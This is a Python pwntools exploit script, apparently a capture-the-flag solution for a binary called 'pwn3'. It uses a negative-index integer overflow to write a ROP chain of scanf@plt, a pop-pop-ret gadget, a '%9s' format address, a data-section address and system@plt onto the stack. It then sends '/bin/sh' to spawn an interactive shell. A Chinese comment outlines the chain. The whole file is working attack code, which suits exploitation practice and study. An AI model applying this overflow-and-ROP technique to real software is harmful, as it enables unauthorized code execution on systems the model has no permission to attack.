#coding=utf-8
from pwn import *
'''
构造chain如下即可获取shell
scanf@plt
ret(pop pop ret)
address of %9s
data段地址
system@plt
填充
data段地址
'''
#context.log_level = 'debug'

#r = remote('127.0.0.1', 7000)
r = process('./pwn3')
r.recvuntil('name \n')
gdb.attach(r)
r.sendline('123') 

#raw_input('debug')
r.recvuntil('index\n')
r.sendline(str(-2147483648 + 14))
r.recvuntil('value\n')
r.sendline(str(int('8048470', 16))) #scanf@plt


r.recvuntil('index\n')
r.sendline(str(-2147483648 + 15))
r.recvuntil('value\n')
r.sendline(str(int('0x080487de', 16))) #ret(pop pop ret)

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 16))
r.recvuntil('value\n')
r.sendline(str(int('804884b',16))) #address of %9s

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 17))
r.recvuntil('value\n')
r.sendline(str(int('804a030', 16))) #data段地址

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 18))
r.recvuntil('value\n')
r.sendline(str(int('8048420', 16))) #system

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 19))
r.recvuntil('value\n')
r.sendline(str(int('804a030', 16))) #pad

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 20))
r.recvuntil('value\n')
r.sendline(str(int('804a030', 16))) #data段地址

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 21))
r.recvuntil('value\n')
r.sendline(str(int('8048420', 16)))

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 22))
r.recvuntil('value\n')
r.sendline(str(int('8048420', 16)))

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 22))
r.recvuntil('value\n')
r.sendline(str(int('8048420', 16)))

r.recvuntil('0 0 0 0 0 0 0 0 0 0 ')
r.sendline('/bin/sh') 

r.interactive() 
